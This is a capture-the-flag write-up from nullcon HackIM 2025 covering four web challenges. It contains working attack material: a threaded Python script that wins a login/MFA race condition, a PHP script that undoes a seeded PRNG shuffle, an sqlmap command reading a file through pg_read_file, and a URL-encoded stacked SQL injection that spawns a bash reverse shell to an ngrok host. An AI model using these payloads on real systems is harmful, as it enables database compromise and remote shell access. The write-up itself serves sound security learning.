---
title: "nullcon HackIM CTF Berlin 2025"
date: 2025-09-12
description: "not too much..."
draft: false
author: "hsw"
type: "post"
tags: [web]
categories: [Write-ups]
cover: 'https://ctf.nullcon.net/files/6e2a2b9a3c150ac95636f00c62fdeda9/HackIM_Screen.jpg'
translationKey: 'media'
stage: "evergreen"
toc: true
---


Congrats to RaptX got 2nd place!

## webby (first blood)

When we login, it set the variable `loggedIn=True` and the username is current username that we login (which is both conditions needed for the flag), and the `/mfa` checks the admin. But here the misconfiguration causes the race condition:
```py
...
        else:
            session.loggedIn = True             # <- race window start 
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            #session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
            session.loggedIn = False            # <- race window end 
            session._save()
...
```

```py
class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)
```
So we just need to call the `/flag` quickly when in the race window, here is solve script:

```py
import threading, requests, time, sys

BASE = "http://52.59.124.14:5010"     
USER, PW = "admin", "admin"

sess = requests.Session()            
sess.get(BASE+"/")                  

flag_found = threading.Event()

def racer():
    """Spray /flag until we win the race."""
    while not flag_found.is_set():
        r = sess.get(BASE+"/flag", allow_redirects=False, timeout=2)
        if r.status_code == 200:
            print("[+] FLAG:", r.text.strip())
            flag_found.set()
            break

threads = [threading.Thread(target=racer, daemon=True) for _ in range(10)]
for t in threads: t.start()

sess.post(BASE+"/", data={
    "username": USER,
    "password": PW,
    "submit":   "Login"
}, timeout=5)

for t in threads: t.join(1)
if not flag_found.is_set():
    print("[-] Didn’t win the race, run again or add more threads")

```


## pwgen 

Easily we can identify this is unsecure PRNG, here is solve script with ChatGPT :D 
```php
<?php

$shuffled_flag = "7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154";
$flag_length = strlen($shuffled_flag);

$identity_string = '';
for ($i = 0; $i < $flag_length; $i++) {
    $identity_string .= chr($i);
}

echo "Searching for the flag by reversing all possible shuffles (1 to 1000)...\n";

for ($n = 1; $n <= 1000; $n++) {
    srand(0x1337);
    $permuted_identity = '';
    for ($i = 0; $i < $n; $i++) {
        $permuted_identity = str_shuffle($identity_string);
    }

    $inverse_map = array_fill(0, $flag_length, 0);
    for ($shuffled_pos = 0; $shuffled_pos < $flag_length; $shuffled_pos++) {
        $char_at_shuffled_pos = $permuted_identity[$shuffled_pos];
        $original_pos = ord($char_at_shuffled_pos);
        $inverse_map[$shuffled_pos] = $original_pos;
    }

    $potential_flag_array = array_fill(0, $flag_length, '');
    for ($i = 0; $i < $flag_length; $i++) {
        $potential_flag_array[$inverse_map[$i]] = $shuffled_flag[$i];
    }
    $potential_flag = implode('', $potential_flag_array);

    if (strpos($potential_flag, '{') !== false && strpos($potential_flag, '}') !== false) {
        echo "--------------------------------------------------\n";
        echo "✅ Success! Found a potential flag at shuffle count (nthpw) = $n\n";
        echo "Flag: $potential_flag\n";
        echo "--------------------------------------------------\n";
        break; 
    }
}

?>
```

## dogfinder-v1

To be honest, i think ill be certificated prompt engineer after solve 2 versions of this black box challege, firstly i did sqlmap to find the sink that is `order` parameter, then i just prompt with the information i got (also i did research in paralel)

Payload for V1:

```bash
python3 sqlmap.py -u "http://52.59.124.14:5020/?order=id" -p order \
  --sql-query="SELECT pg_read_file('flag.txt',0,8192);" \
  --batch --threads=4 --time-sec=8 
```

## dogfinder-v2 (first blood)

I guess everyone is can easily do the v1, and lack a little lucky for v2, yall know its only have `pg_execute_server_program`, i tested multiple time with https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html?highlight=pentest%20postgre#rce then still no luck, after ~1 hour, i got the flag:  
  
![f 1](/commons/ctfs/nullconCTF2025/f1.png)

![f 2](/commons/ctfs/nullconCTF2025/f2.png)

Aight, but i still can't sleep tho, but somehow it has a bit longer then i tried to make rev shell and BOOM, it worked! Here is final payload:

```
http://52.59.124.14:5021/?order=1%3BSET%20ROLE%20pg_execute_server_program%3BCOPY%20(SELECT%20'')%20TO%20PROGRAM%20'bash%20-c%20"exec%20bash%20-i%20>%26%20/dev/tcp/0.tcp.ap.ngrok.io/12365%200>%261"'%3BSELECT%20'shell'%2C1%2C1%3B--
```